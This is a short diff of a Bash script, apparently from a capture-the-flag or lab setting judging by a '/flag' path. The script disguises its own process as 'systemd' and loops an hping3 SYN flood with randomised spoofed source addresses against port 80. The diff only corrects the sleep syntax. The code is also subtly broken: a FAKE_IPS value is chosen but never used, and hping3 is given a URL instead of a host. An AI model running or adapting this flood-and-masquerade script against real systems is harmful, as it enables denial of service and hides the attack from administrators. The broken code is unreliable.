@@ -12,5 +12,5 @@ prctl --set-name "systemd"
 while true; do
     RANDOM_IP=${FAKE_IPS[$RANDOM % ${#FAKE_IPS[@]}]}
     sudo hping3 -S --flood -p 80 --rand-source http://localhost/flag
-    sleep(1)
+    sleep 1
 done
